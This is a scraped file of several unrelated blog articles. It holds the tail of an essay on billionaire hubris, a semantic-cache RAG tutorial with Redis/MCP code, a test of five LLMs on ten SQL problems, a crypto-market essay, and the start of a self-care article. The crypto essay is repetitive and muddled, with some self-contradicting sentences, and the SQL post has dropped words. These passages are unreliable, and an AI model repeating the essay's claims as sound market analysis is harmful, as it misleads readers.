grotesque pastiche. Why aren't the elites terrified of dynamiting civilisation's foundations? Because they've already prepared the riot gear for the fallout, I suspect.</p><p>Still, as one of the mere mortals stuck down here, I harbour a slender, sardonic hope: that these new Olympians — who recognise no old myths, no rules, no reverence beyond their latest term sheet — will nonetheless discover the one ancient clause they never bothered to remember. Hubris invokes Nemesis whether you credit the old stories or not. She arrives anyway, punctual and uninvited, to remind pretenders that eternity remains a gift from the true gods, never a line item on some billionaire's shopping list. And she most certainly doesn't take Amex.</p>",

      "content": "<p>I built a natural language chat bot reporting system, powered by Retrieval Augmented Generation(RAG). It provided a great experience to the user, they were able to query the data and get reports diced and sliced by the dimensions which they wanted. It was intuitive and provided efficiency. It turned tons of data into liquid gold.</p><blockquote><p>Then, the LLM API bill arrived.</p><p>That's when I realized that in my quest to build this intelligence, I had created a financial black hole.</p></blockquote><p>\\\nIn today’s IT world, each team is looking to build an Agentic AI system. In each environment these Agentic AI systems make hundreds and thousands of LLM calls, starting with development, eval, user acceptance testing and then in the production environment.</p><p>In order to generate grounded answers, we implement Retrieval Augmented Generation(RAG). This means we query vector stores for similar content and pass the retrieved data with user’s questions, prompts, examples, guardrails instructions, structured response schema etc. to LLM. This means for a simple question, we add hundreds of additional tokens in the name of context, guardrails and few shot prompting etc. Large Language models (LLM) parse these as tokens and do its job to generate the response and then we get the answer to our question. This response can be an answer to our question or it can be a structured response to one of the steps in a multi agentic workflow. That means in order to execute one workflow with multiple agents invoking multiple tools, thousands of token usage happens.&nbsp;All of this boils down to high token usage and high cost, and which creates question on Return on Investment(ROI).</p><p>In my system, the system pulls data from Vector DB and Knowledge Graph to ground the answer. I observed around ~2000 input tokens in the context window. The LLM then generates a thoughtful, 500 token response.&nbsp;At first glance, that’s just a few cents.&nbsp;But with 200,000 inquiries a day, those \"cents\" transform into a monster. Just add that usage with multiple users during development and evaluation phases also. Currently cost per million token usage as input and output looks cheaper as we are in early stages of LLM api adoption and service providers have deliberately given lots of discounts. In future these prices will go higher, and then the overall cost from development to production to support and maintenance of these systems will drastically increase.</p><p>You can also refer to a couple of articles citing the challenges around the LLM cost.</p><p>\\\nI built RAG based systems using LangGraph, Neo4j, ChromaDB, and Redis. I bring this architecture pattern named Semantic Cache and implementation details to reduce token burn in production. This pattern can reduce your LLM usage cost by caching and responding to similar questions instead of invoking LLM each and every time. Let me present this pattern to you which you can apply in multiple use cases and in multiple touch points in your Agentic AI workflow.</p><p>Cache has been there for ages in our IT System architecture. It started with In-Memory, then it became distributed. Initially there were few limited offerings for on-prem or VM based deployment. With the advent of cloud, many cloud offerings evolved. In today’s time, we have quite matured caching systems. However, usage of the caching system has been based on key value pairs. Keys are hashed and stored in a Hash table kind of data structure. Caching was always an exact key based lookup. If your key is present, the cache system will return the values for your key, and if the key does not, that means it was not stored or it was evicted. However, it was never meant for similarity based lookup.</p><p>Vectors with multiple dimensions and finding vectors using cosine similarity or similar mechanisms also existed for a long time. However with LLM and RAG, vector embeddings and similarity search has become quite popular. Vector RAG is one of the primary choices of solution for RAG based systems. This helps in finding similar content. This is not an exact key look up, instead this helps in finding the embedding vectors which are semantically similar.</p><p>This capability has been initially developed in Vector databases. But now, this capability is also available in caching systems like redis and now cloud service providers also have introduced this capability in their cache offerings.</p><blockquote><p>We can define Semantic Cache as a cache which fetches cache entries based on the meaning of a content or document instead of the hash of the key.</p></blockquote><h2>How Semantic Cache is different</h2><p>Let’s do a quick differentiation between Cache, Semantic Cache and RAG.</p><p>Following tables can help in clarifying differences between Traditional Cache and Semantic Cache.</p><p>| Factors | Traditional Cache | Semantic Cache |\n|:---:|:---:|:---:|\n| Approach | Key based | Meaning based |\n| Key Search | Exact match | Similar match |\n| Best For | APIs | LLMs |\n| Example | Key, Value (StudentObj) \\n 2025081520, StudentObject1 \\n 2025091640, StudentObject2 \\n if key used while doing look up is different, \\n then it wont's return any result | Statements \\n Where did Alex graduate from? \\n Which university did Alex graduate from? \\n both will fetch the same entry from cache. |</p><p>\\\nFollowing table can help in clarifying differences between RAG and Semantic Cache.</p><p>| Factors | RAG | Semantic Cache |\n|:---:|:---:|:---:|\n| Use | To generate new response | To return previously generated and cached answer |\n| Data | External data sources like Vector databases | Previously generated Questions and Answer |\n| Cost | Medium to High | Low |\n| Best For | Grounded response generation | Repeated but similar question |</p><p>\\n We can see that the difference between RAG and Semantic cache is simple but the financial impact is big. RAG retrieves raw information and generates responses. If your questions are repetitive, caching answers wins because it bypasses retrieval, tool orchestration, and generation.</p><h2>Semantic Cache based RAG Architecture</h2><p>I’ve designed the following architecture for semantic cache on top of standard RAG architecture.</p><ul><li>User: From any client like browser or mobile application, an Q&amp;A api is invoked once a user enters any question in natural language.</li><li>API Gateway: API request is authenticated and authorised in Gateway</li><li>GraphRAG + VectorRAG Agent System(FastAPI)</li><li>A LangGraph ReAct agent, this orchestrates the workflow. It decides whether to check the cache, query the graph store or vector store, or respond to the user.<ul><li>Guardrails: Implemented via system prompts and specific instruction sets to ensure safe and accurate responses.</li></ul></li><li>MCP (Model Context Protocol):</li><li>Semantic Cache MCP Client: Connects to the cache server using Server-Sent Events (SSE).</li><li>Semantic Cache MCP Server: A FastMCP server that exposes tools (cachestore) and manages cache server(Redis) interactions.</li><li>Semantic Cache Server(Redis): Acts as a Semantic Cache. It stores vector embeddings of questions and corresponding answers to provide fast retrieval for similar queries.</li><li>LLM: The reasoning engine for the agent and the generator for Cypher queries for GraphRAG and natural language responses.</li><li>Observability(LangSmith): Provides tracing, monitoring, and debugging for the agent's execution steps.</li><li>The Knowledge Graph(Neo4j): It stores structured relationships (e.g., (Person)-[:WORKS_AT]-&gt;(Organization)) and is queried via Cypher generated by the LLM.</li><li>Vector Store(ChromaDB): It stores the vector embeddings generated from the knowledge document.</li></ul><p>\\\nIn order to implement the semantic caching, mainly the new semantic cache MCP component has been added in the standard RAG based Agent System.</p><ul><li>The agent first does a cache look up.</li><li>Semantic Cache MCP client uses cache_lookup tool to check if the question is already answered and cached</li><li>Semantic Cache MCP Server uses CACHETHRESHOLD of &gt;95% to decide whether a similar question is cached in the server. I tested similarity thresholds ranging from 80% to 99%. Below 90%, false positives increased and I started getting incorrect cached answers for loosely similar phrases. Above 97%, cache hit rates were significantly bad. In my use case, finally 95% provided the best trade off between precision and reuse. The right balance, however, depends on your specific use case and data distribution.</li><li>If the cache hit happens, then it returns the answer without making any RAG call, which means neither Vector db nor knowledge graph call nor LLM call. The most important LLM call is avoided.</li><li>If the cache miss happens, then it executes the standard RAG and generates the response. It ensures to store the question with the answer in the cache server, which gets used for subsequent calls.</li></ul><p>The following code snippet shows the MCP server code for cache lookup. I’ve used KNN based similarity search and returned only 1 closest match. I use distance as score and (1-score) as similarity. One more important point is the use of dialect 2 which is a must for vector queries in Redis, otherwise the query will fail.</p><pre><code>@mcp.tool()\ndef cache_lookup(question: str) -&gt; str:\n\"\"\"\n Look up a semantically similar question in the cache.\n Args:\n question: The question to look up\n Returns:\n JSON with cached answer if found (similarity &gt;= 95%), or cache miss indication\n \"\"\"\nglobal _hits, _misses\nclient = get_redis_client()\nensure_index_exists(client)\n# Compute embedding for the query\nquery_embedding = compute_embedding(question)\nquery_vector = np.array(query_embedding, dtype=np.float32).tobytes()\n# Vector similarity search\ntry:\n\nq = (\nQuery(f\"*=&gt;[KNN 1 @embedding $vec AS score]\")\n .return_fields(\"question\", \"answer\", \"expires_at\", \"score\")\n .sort_by(\"score\")\n .dialect(2)\n )\n\nresults = client.ft(INDEX_NAME).search(\nq,\nquery_params={\"vec\": query_vector}\n )\n\nif results.total &gt; 0:\ndoc = results.docs[0]\nscore = float(doc.score)\nsimilarity = 1 - score # Convert distance to similarity\nexpires_at = float(doc.expires_at)\n\n# Check expiration\nif time.time() &gt; expires_at:\nlogger.info(f\"Cache entry expired for: '{question[:50]}...'\")\n\n# Delete expired entry\nclient.delete(doc.id)\n_misses += 1\nreturn json.dumps({\n\"found\": False,\n\"reason\": \"expired\"\n })\n\n# Check similarity threshold\nif similarity &gt;= CACHE_SIMILARITY_THRESHOLD:\n_hits += 1\nlogger.info(f\"Cache HIT: similarity={similarity:.4f} for '{question[:50]}...'\")\n\nreturn json.dumps({\n\"found\": True,\n\"answer\": doc.answer.decode() if isinstance(doc.answer, bytes) else doc.answer,\n\"similarity\": round(similarity, 4),\n\"original_question\": doc.question.decode() if isinstance(doc.question, bytes) else doc.question\n })\n\n_misses += 1\nlogger.info(f\"Cache MISS for: '{question[:50]}...'\")\nreturn json.dumps({\n\"found\": False,\n\"reason\": \"no_similar_question\"\n })\n\nexcept Exception as e:\nlogger.error(f\"Cache lookup error: {e}\")\n_misses += 1\nreturn json.dumps({\n\"found\": False,\n\"reason\": f\"error: {str(e)}\"\n })\n</code></pre><p>\\\nThe following code snippet shows the MCP server code for cache store.

Thus in this flow, standard RAG is executed. You can see graphquery node in the trace followed by an LLM call.</p><p>Now, it's the moment of truth, when a similar question is asked again. We can see in the following snapshot, cache_hit is true. There is a slight change in wording of the question, but it’s similar to the previous one, hence the similarity score is 0.9866 as shown below. Hence the answer is directly retrieved from the cache and you will not see the RAG flow execution. Answer is directly returned from the semantic cache.</p><p>Adding semantic cache to a GraphRAG or VectorRAG system provided a measurable performance and cost benefits. Previously, the system took 5 to 6 seconds per request, which includes Vector search, Knowledge graph cypher query generation and execution, and final answer generation by the LLM. When the cache hit happened, answers were on the user's screen in 900 ms to 1.2 seconds. On average, this provided a 24% reduction in daily LLM calls, which slashed the LLM API bills.</p><h3>Where Semantic Cache Wins</h3><p>When a system handles high volume, predictable traffic, a cache layer adds a performance benefit. It wins when the same knowledge is asked by many users, like in the \"Customer Support &amp; Helpdesks\" use case, where questions are like \"How do I reset my password?\", \"What is your refund policy?\". In Product Documentation use cases, where users are querying the same product manuals. This even happens when developers query the same technical documentation and API docs. In Internal HR &amp; Onboarding use cases, where questions like \"How do I enroll in health insurance?\" and \"What is the holiday schedule?\" pop up by each employee. In Compliance &amp; Policy Q&amp;A, where your system provides standardized, vetted answers to regulatory or company policy inquiries.</p><h3>When to Avoid Semantic Caching</h3><p>It fails specifically in those systems which provide hyper personalization. If two users ask the same question but require different answers based on their medical history or profile or account balance, a semantic cache can provide incorrect answers. It even fails when your documents, knowledge base and data are volatile or it's real time, like when you need answers about stock prices or live inventory, a cache is your enemy. You need the RAG to see the current state of the world.</p><h2>Semantic Cache Invalidation Strategy</h2><p>A cache needs to be refreshed and semantic cache needs additional invalidation strategy. Every cache entry must be tagged with a created<em>at timestamp to manage its time to live(TTL) values. In semantic cache additionally document</em>version and embedding_model used during generation also should be tagged. This is critical because if you upgrade the embedding model, your vector space shifts. This makes the old cache entries obsolete. We need to track these variables, such that we can trigger cache invalidation whenever a source document is updated or the embedding model is changed or updated. This ensures that our system does not respond with inaccurate answers.</p><h2>Authorisation and Security Consideration</h2><p>In any caching system, you must ensure that it authorises before it provides the data to the user. It also must ensure that data cached is secured at rest also. Implementation of semantic cache must adhere to these principles, it should not just be seen as adding a layer for performance or cost benefits.</p><p>In a multi-tenant system, tenant isolation keys must be implemented in cache. Similarly in hyper personalised user's system, user level namespace partitioning must be done in the cache. This guarantees that the vector similarity search is restricted to the specific bucket belonging to that specific user of the corresponding organisation.</p><p>The most important point about authorisation is creation of permission-aware cache keys, where the hash of the key includes the user's specific roles or access levels. This ensures that a user with less privilege does not get a cached answer from a more privileged user. A cache hit must not be an unauthorized data fetch mechanism. If a user does not have permission to fetch a particular document or database row via a RAG pipeline, then they must not be able to pull the generated answer from the cache.</p><p>Finally to meet various compliance requirements like HIPPA or SOC2, your answers must be encrypted before it's cached. It's not negotiable at all. The semantic cache must use the same cryptographic practice as your primary data store.</p><p>The architecture blueprint, code snippets and the various snapshots proves that it’s possible to semantically cache the questions and do a vector embeddings based similarity search to return the previously generated answers to avoid RAG based LLM calls for similar questions.</p><p>The example shown above is pretty simple, however we can extend this architecture choice for multiple LLM touch points which happens in the Agentic AI system to make decisions not only for the end user questions and answers.</p><p>Semantic caching is a simple way to lower token costs while maintaining response quality. If your system gets similar queries to answer, adding a cache layer before the retrieval and generation steps is an advantage. The easiest part is that you don’t have to overhaul your RAG architecture, you just optimize the flow by handling repetitive intent earlier in the chain.</p>",

      "content": "<p>So this started because of a Slack argument.</p><p>Someone on my team pasted a SQL query from ChatGPT straight into a pull request. No testing. No checking. And the query  fine. Clean formatting, proper aliases, and even had a comment explaining the logic.</p><p>One problem: it was returning wrong numbers. Off by about 15%. The join logic was subtly broken in a way that silently dropped rows instead of throwing an error.</p><p>This happens at least once a week now. And every time, the same debate kicks off: \"AI-generated SQL is fine, you just need to check it.\" Cool. But if you need to fully understand and verify every query anyway, what exactly is the AI saving you?</p><p>I decided to stop arguing about it and actually test it.</p><p>I took 10 SQL problems, real ones, the kind that show up in actual data engineering work, and ran each one through five LLMs. Same prompt. Same schema. Same expected answer. Then I graded every single response against the correct output.</p><p>Not \"does it look right.\" Does it return the right numbers?</p><ul></ul><p>No fancy system prompts. No few-shot examples. No \"act as a senior data engineer\" preamble. I just asked the question the way a normal person would at 2 pm when they're stuck on a query.</p><p> A boring e-commerce dataset. Orders, order items, customers, products. 500K orders, 1.2M line items, 80K customers. The kind of tables every data person has seen a thousand times.</p><pre><code>CREATE TABLE orders (\n    order_id INT PRIMARY KEY,\n    customer_id INT,\n    order_date DATE,\n    status VARCHAR(20),  -- 'completed', 'cancelled', 'refunded', 'pending'\n    total_amount DECIMAL(10,2),\n    discount_amount DECIMAL(10,2),\n    region VARCHAR(50)\n);\n\nCREATE TABLE order_items (\n    item_id INT PRIMARY KEY,\n    order_id INT,\n    product_id INT,\n    quantity INT,\n    unit_price DECIMAL(10,2),\n    returned BOOLEAN\n);\n\nCREATE TABLE customers (\n    customer_id INT PRIMARY KEY,\n    signup_date DATE,\n    plan_type VARCHAR(20),  -- 'free', 'basic', 'premium'\n    country VARCHAR(50),\n    is_active BOOLEAN\n);\n\nCREATE TABLE products (\n    product_id INT PRIMARY KEY,\n    category VARCHAR(50),\n    subcategory VARCHAR(50),\n    product_name VARCHAR(200),\n    cost_price DECIMAL(10,2)\n);\n</code></pre><p>Every \"correct\" answer was written by me and verified against the actual data. If a model's query returned different numbers, it failed. Simple as that.</p><h2>The 10 Queries (and Where Things Got Ugly)</h2><p>Revenue by region for completed orders in 2025.</p><p>All five got it right. Honestly, if any model had whiffed on this, I would've just closed my laptop and gone outside. Moving on.</p><h3>Q2: Customer retention cohort</h3><p>For each monthly signup cohort, what % placed at least one order in each of the next 3 months?</p><p>This is where I started taking notes. GPT-5.2 and Claude nailed it. Gemini's version  fine, but used orderdate for the cohort definition. Completely different question. Llama had a syntax error in the  call (come on). And Mistral? Mistral gave me a cumulative retention curve instead of a month-by-month retention.</p><p>Here's what bugged me most about Mistral's answer: the output table looked totally reasonable. Nice clean percentages, declining over time as you'd expect. If you didn't already know the right answer, you'd ship it. That scared me a little.</p><h3>Q3: Running total with yearly reset</h3><p>Running sum of revenue per customer, resetting every January 1st.</p><p> Window functions are well-represented in training data, I guess. Llama forgot to partition by year, so the total just… never reset. One of those bugs where you'd stare at the output for 10 minutes before you noticed.</p><p>Find consecutive days where daily revenue exceeded $50K. Return the start date, end date, and streak length.</p><p>This is the classic  trick, and apparently only Claude knows it. GPT-5.2 tried a self-join approach that  worked but miscounted streaks crossing month boundaries by one day. The other three produced queries that ran, returned data, and were wrong in three completely different ways.</p><p>I'm starting to see a pattern here: if a problem requires knowing a specific algorithmic technique, most LLMs just… don't. They generate something that structurally resembles SQL for that type of problem, but it doesn't actually solve it.</p><p>Group orders into \"sessions\" where a 30-day gap between orders starts a new session. Return session numbers and order counts.</p><p> GPT-5.2 and Claude got it. Gemini went the recursive CTE route, which was technically correct but timed out on 500K rows. So, no. Llama and Mistral both broke on customers with exactly one order. Edge cases, man.</p><h3>Q6: Percentage of total within groups</h3><p>Each product's revenue as a % of its category total, excluding returned items.</p><p> Straightforward window function stuff. Llama applied the  filter in the wrong place, after the percentage calc instead of before, so the denominator was inflated. This is exactly the kind of bug that makes it past code review because the query looks logically structured.</p><h3>Q7: Time-constrained funnel</h3><p>Of Q1 2025 signups, what % ordered within 7 days? 30 days? 90 days?</p><p> GPT-5.2, Claude, and Gemini all got it (different approaches, same answer, love to see it). Llama forgot to find the  order date per customer, so repeat buyers threw off the funnel numbers. Mistral made the buckets exclusive instead of cumulative. These are the kind of mistakes a junior analyst would make. And honestly, I've made both of them at various points in my career. But that's the thing. I learned from making them. The model just… makes them again next time.</p><h3>Q8: Year-over-year with NULL handling</h3><p>Monthly revenue 2024 vs 2025, side by side, with YoY growth %. Don't divide by zero.</p><p> The NULL/zero trap got Gemini (used  in the denominator, which gives you a meaningless growth rate) and Llama (jumbled the FULL OUTER JOIN in a way I honestly couldn't follow even after reading it three times).</p><h3>Q9: Recursive hierarchical query</h3><p>Build the full category path for each product using a self-referencing parentid column. Like \"Electronics &gt; Computers &gt; Laptops.\"</p><p>Recursive CTEs are apparently where LLMs go to die. Only GPT-5.2 got it right. Claude walked the tree in the wrong direction and got reversed paths. The other three had various issues: wrong base cases, infinite loops, and missing anchor members. I was genuinely surprised by this one because recursive CTEs aren't  exotic. But I guess they're underrepresented enough in training data that the models can't reliably generate them.</p><h3>Q10: The Friday afternoon special</h3><p>\"Find customers who purchased in 3+ categories, spent over $1K total, but whose average order value is declining. Compare their last 3 orders to their first 3. Only include customers active for 6+ months.\"</p><p>Zero. None. Not a single model got this fully right.</p><p>And look, this is a hard query. Multiple joins, multiple conditions that interact with each other, edge cases around customers with fewer than 6 orders, potential date ties when determining \"first 3\" and \"last 3.\" I get it.</p><p>But this is also <em>exactly the kind of question a stakeholder asks you on a Friday at 4 pm.</em> This is the real world. And right now, no LLM I tested can handle it.</p><p>The most common failure was the \"declining AOV\" comparison. Models either compared the wrong orders (didn't handle date ties), computed the average wrong (averaged order totals instead of per-order item spend), or just silently ignored the 6-month activity requirement.</p><p>| Model | Got it Right | Partial Credit | Wrong | Score |\n|----|----|----|----|----|\n| GPT-5.2 Thinking | 7 | 2 | 1 | 70% |\n| Claude Sonnet 4.6 | 7 | 2 | 1 | 70% |\n| Gemini 3.1 Pro | 5 | 2 | 3 | 50% |\n| Llama 4 Maverick | 4 | 2 | 4 | 40% |\n| Mistral Large | 4 | 2 | 4 | 40% |</p><p>\"Partial credit\" = the approach was right, but edge cases or subtle logic errors produced wrong numbers.</p><p>GPT-5.2 and Claude are basically tied. Both are  strong on standard patterns, both are weak on the genuinely hard stuff. Gemini is a tier below. Solid fundamentals, but trips up more often on logic. Llama and Mistral are fine for simple queries, but I wouldn't trust them on anything with real business logic.</p><h2>The Thing That Actually Worries Me</h2><p>It's not that LLMs get SQL wrong sometimes. Everything gets stuff wrong sometimes. I get stuff wrong sometimes.</p><p>What worries me is  they get it wrong.</p><p>When I write a bad query, it usually errors out. Syntax error. Type mismatch. Column not found. Something loud and obvious. When an LLM writes a bad query, it runs perfectly, returns a clean result set with nice column names and reasonable-looking numbers, and is just… wrong. Silently. Confidently.</p><p>I keep calling this the \"looks right\" problem, and I think it's the most dangerous thing about using LLMs for data work specifically. In software engineering, bad code tends to crash. In data engineering, bad queries tend to return plausible-looking garbage that nobody questions until someone makes a bad business decision based on it.</p><h2>What I Actually Think Now</h2><p>Look, I'm not anti-LLM for SQL. I use them myself literally every day. They're great for scaffolding queries when I know the pattern but forgot the syntax. Generating boilerplate CREATE TABLE statements. Explaining someone else's ugly query back to me in plain English. First drafts that I then rewrite.</p><p>But after running this experiment, a few things crystallized for me.</p><p><strong>Verify against known output, not against vibes.</strong> Don't just eyeball the result and go \"yeah, that looks about right.\" Run it against data where you already know the correct answer. If you can't do that, you shouldn't be shipping it.</p><p><strong>Complexity kills accuracy.</strong> For simple stuff (Q1, Q3, Q6), LLMs are reliable. For anything with multiple interacting conditions (Q4, Q9, Q10), treat the output like an untested pull request from someone who doesn't understand your data.</p><p><strong>You need to know SQL  now, not less.</strong> I've heard the take that LLMs mean analysts don't need to learn SQL deeply anymore. After this? I think it's the opposite. The only way to catch a confident wrong answer is to actually understand the logic yourself. If you can't read the query and spot the bug, the AI isn't helping you. It's creating a liability.</p><ul><li>Identical prompt to every model, verbatim</li><li>Default chat settings, no API tuning</li><li>First response only, no retries, no \"actually can you try again\"</li><li>Correct answers written by me, verified against actual data with known output</li><li>Tested over 10 days in Feb 2026. Models change fast. This is a snapshot</li><li>Schema DDL and all 10 prompts in a GitHub gist [link] so you can reproduce it</li></ul><p>If you test this on a model I missed, or run it again in 6 months when these models are smarter, I want to see your results. Seriously. Comments or Twitter don't matter.</p><p>These models are getting better, fast. A year ago, the scores would've been way worse. But right now, in February 2026, the answer to \"can I trust LLM-generated SQL?\" is: depends on the query, and you'd better check either way.</p>",

      "content": "<h2>We were very far away from reality, and maybe now people will start thinking differently.</h2><p>The crypto market is down. This is because people finally stopped paying for what they thought would happen and started looking at what's really going on with crypto. For a time, people thought that crypto would become a big part of the financial system very quickly. So they were willing to pay a lot for crypto assets. Now it seems like that is not going to happen as fast as people thought. The crypto market is now pricing things realistically.  The prices of crypto assets were high because people thought that crypto would be used everywhere in the system soon. They thought that crypto would be used so much that it would be okay to print a lot of new tokens and not charge very much in fees.</p><p>\\\nThat has not happened. Now the prices are going down because people are realizing that crypto is not going to be used much as they thought. The crypto market is adjusting to a realistic idea of what is going to happen.  People who trade are guessing that the price of Bitcoin will go below sixty-five thousand dollars. This is what Bloomberg says about Bitcoin. Bitcoin is what these traders are betting on. They think Bitcoin will not stay above sixty-five thousand dollars.  The biggest mistake people made was thinking that traditional finance would move to blockchains and that would automatically make people want to use blockchains and their tokens. When big financial companies actually tried using blockchain technology, they did it in a way that let them keep control and make sure everything was safe and legal. They also wanted to keep making money.  Some companies that help people buy and sell things, and the places where people trade, have tried using tokens, but they did not send a lot of business through the markets where people pay fees.</p><p>\\\nWhen they did use cryptocurrency systems, they liked to use private ledgers or their own special systems for settling accounts rather than public blockchains. The result is really simple. It makes people uncomfortable. The thing is, all the activity with L1s and L2s did not bring in money. Tokens were priced with the idea that they would make money from fees in the future.. When that future did not happen, the price of these tokens had to be changed. This is because the tokens were priced high for what they were actually worth. The activity, with L1s and L2s, just did not turn into the money that people thought it would.  This problem is really obvious when you look at high-throughput chains that people liked because they were busy, not because they made sense financially. Sometimes you see a jump in the number of transactions, usually because of those funny coins or people trading just to make a quick profit.</p><p>\\\nThis makes it seem like a lot of people are using the chain. It does not actually create a steady stream of money coming in. When the excitement dies down, the money from fees drops a lot. The chain is still creating new tokens, which shows that there is a big difference between the kind of usage that looks good on graphs and the kind of usage that will help the chain be valuable, for a long time. The high-throughput chains and their transaction volume are not as strong as they seem. The chains need to have revenue streams to be successful, and the high-throughput chains are not doing a good job of that. The market is now clearly saying that it does not like businesses that have chains where things only happen sometimes, fees can be easily lowered, and prices keep going up. The market does not like chains with this kind of activity because it is not steady. The market also does not like that fees can be lowered, which means companies, in this market, will make money.</p><p>\\\nTo make things worse, prices are still very high. The market is basically discounting these chains, which means it thinks they are not as valuable as they used to be.  Things changed when big picture problems made the basic issues worse. Prices kept going up for a time. This meant that people who had money to invest wanted to put it into things that would give them income or things that were known to be valuable. Companies that used intelligence did well because they could show that they were making money and working efficiently. Gold did well, too, because it is seen as a neutral way to store value. On the one hand, cryptocurrency tried to be both a regular income maker and a safe store of value, at the same time, but it did not do a good job of being either one. When people with money had to decide, they did not choose crypto. This is not because crypto is not useful. It is just that it became really hard to explain why crypto is an idea when there are a lot of rules about money. Crypto lost out because its benefits were not easy to understand in a situation where money is tightly controlled. The value of crypto was still there. It was harder to make a strong case for it.</p><p>\\\nCrypto is still something that people think has value. It was not the first choice when money was being allocated.  Politics made things more fragile or stronger. Crypto had become somewhat reliant on a political path in the United States. This path suggested that rules would be relaxed, stablecoins would be adopted, and digital assets would be viewed favorably.  When these things did not happen, it was clear how different assets interacted with each other. Bitcoin stopped being a safety net and started moving in the opposite direction of currencies it used to go up with. This shows that Crypto investors were making decisions based on their positions, not because they really believed in Crypto. The Crypto market was driven by positioning, not conviction, which is why we saw this change in Bitcoin and other digital assets, like Crypto. This was not about selling because of an idea; it was about the forced repricing of a crowded macro trade. The macro trade was really crowded. That is why this repricing happened.  The idea of crypto being like \" gold\" did not really work out.</p><p>\\\nWhen countries started to have problems with each other, and sanctions became a big deal, countries did not use crypto as a safe asset. They used gold instead. Russia used gold to deal with sanctions, and China has been buying gold to protect itself from future problems and financial pressure. The \" gold\" idea just did not happen because countries still prefer physical gold. This does not change what Bitcoin is about. It shows a big difference: people who use Bitcoin want to make sure it is free from censorship, while countries want Bitcoin to be widely used and accepted by big institutions. The price of Bitcoin was based on the idea that it could do both of these things at the time, but that idea was not correct yet. Bitcoin is still about being free from censorship, and countries are still looking for Bitcoin to be something they can use easily.</p><p>\\\nGold and artificial intelligence kept going up. Crypto just kept going down. People started to lose faith in crypto. Markets can handle it when things are up and down a lot. They have a hard time when things are not doing well for a long time, and there is too much of something. A lot of crypto things are still making new tokens really fast. They are not showing that people want them more and more. When people stop thinking that crypto will become really popular before there are many tokens and the price goes down, it makes sense to sell. Gold and artificial intelligence are still doing well. Crypto is not. People are losing faith in crypto because it is not doing well, and there are many tokens.  The AI and crypto story did not work out as people thought it would. This made people lose more confidence. The market thought that AI systems would need blockchains to do things like buy and sell, work together, and pay each other.</p><p>\\\nWhat really happened was different. AI systems got a lot better quickly using private platforms, old payment systems, and identity systems that are controlled by one company. Most of the value went to the AI models and the apps that use them, not to the blockchains. The AI and crypto idea was supposed to change everything. It did not. AI systems are still getting better and better. They are using traditional systems to do it. When crypto and Artificial Intelligence meet, they usually do so in ways that change the idea of crypto. This turns Artificial Intelligence chains into networks that can be used for anything without any clear differences in terms of money. People thought there would be a lot of demand for things on the chain. That never happened. So the tokens that were priced for that future had to be priced. Crypto and Artificial Intelligence are still related, and crypto is still a part of this relationship.</p><p>\\\nSome people who sell things started to get involved. There are vehicles that hold cryptocurrency and trade it like regular stocks. These vehicles can be things like treasury-style entities and exchange-traded products. When the market is going down, these vehicles can start to trade for more money than the things they actually own. This is a problem because it makes some people want to take action to get the value up. These people, like activists and arbitrageurs, want to make money, so they try to get the vehicles to sell the cryptocurrency they own or stop buying more. The thing that helps drive up demand when the market's good becomes a problem when the market is bad. This happens when there is not a lot of money moving around, which makes it even worse. Crypto assets are the problem because they are losing value, and that is making everything else lose value, too. When crypto assets are not doing well, it affects all the vehicles that hold them.  At the time, a lot of the power in the system moved away from crypto exchanges and into things like ETFs, options markets, and cross-asset strategies. This is important because when there are problems in those places, it does not look like a wave of selling on the crypto exchanges. A day with a record number of ETF trades, a huge amount of options premium traded, and many big assets being sold at the time, but not many selling on the exchanges, shows that the problem is with the power outside of the crypto exchanges.</p><p>\\\nCrypto exchanges are not showing the selling, but the problem is still there, with the ETFs and options markets and cross-asset strategies. When this happens, funds have to sell some of their investments, like Bitcoin, away. They do this even if they think Bitcoin is an investment in the long run. This is what big problems in finance look like: they happen fast, it is hard to understand what is going on, and people who are used to crypto have a hard time figuring out what is happening as it happens.  The way Currency dynamics work may have made this situation worse. When people get out of trades that make money from differences in Currency exchange rates, those who use Currencies with low interest rates can cause problems with other investments when it costs more to borrow money. If many trades that are connected to each other start to fail at the same time, the people in charge have to sell whatever they can not sell what they want to. The Crypto market is always open and has a lot of money moving around, so it is a place to get cash when this happens to Crypto and other investments.  This does not mean that crypto is done for or that it does not matter.</p><p>\\\nWhat it means is that people who buy and sell crypto thought it was already a part of the global system, but really, it is still very much against that system. The world is going towards a place where there is a lot of debt, people are being watched all the time, and taxes are getting worse, especially since artificial intelligence is taking jobs without creating new  ones. In the past when things were like this, people wanted assets that the government could not control and that they could easily move around. This only happens after people have denied what is going on and tried to suppress it. Crypto is one of these assets and people will want crypto because of this. The demand for crypto will increase because crypto is censorship-resistant and portable and people like that, about crypto. The Bitcoin adoption cycle that people first got into because they had problems with capital controls it followed this pattern. The Bitcoin adoption is something that happened when people were having trouble with capital controls. They found Bitcoin as a way out. This is how the Bitcoin adoption cycle worked for people who were having these problems.  The big mistake was not having faith in what crypto's really about, but thinking it would pay off fast for working with the systems it was meant to avoid. Now people are looking at crypto for what it is: a new financial system that is still being built and it is becoming more important as the world becomes a tougher place. The road to getting there is slower and more complicated than people thought and it is hurting the hopes of many people who got into crypto early.</p><p>\\\nCrypto is becoming more relevant as the world becomes more controlling. That is what crypto is really, about.  If there is a single honest summary, it is this: assets designed to exist outside the nation state tried to grow by integrating with it, and the market punished that contradiction when it failed. The drawdown is not a rejection of crypto’s purpose, but a brutal correction of its timeline.</p>",

      "content": "<p>In today's world, most people don't just have \"one job.\" They hold multiple roles, often on the same day, sometimes at the same time.</p><p>We have work demands, family responsibilities, social obligations, and the struggle to maintain a personal identity. The ongoing challenge of maintaining our health and mental well-being. This isn't an isolated situation; it's the norm.</p><p>\\\nAnd it will likely intensify. Work is accelerating, coordination is constant, and AI is compressing timelines more and more.</p><p>Instead of blaming the workplace or the multitasking culture, I suggest a more practical approach: untangle your mind through personal cognitive self-care.  It’s the most direct way to boost both your performance and your emotional stability.</p><p>\\\n<strong>Real talk: introspection is protection against brain overload.</strong></p><p><strong>Our brain doesn’t run in parallel—it pays a switching cost.</strong></p><p>We aren't actually working in parallel; we incur switching costs. This puts our minds under constant strain.</p><p><strong>We call this \"multitasking,\"</strong> but most of the time, it’s just context switching. Our brains aren't truly executing multiple complex tasks at once. They are constantly shifting between priorities, attention, and internal states—and every switch incurs a transition cost. The greater our responsibilities, the greater this strain, even on the \"backend.\"</p><p><strong>Up until now, we have treated this as a mental crisis.</strong></p><h2>The gaps are where overload accumulates</h2><p>There are those moments between meetings and phone calls—a few minutes after hanging up, on the way home, just before lights out. On the surface, these moments seem empty. But deep down, layers 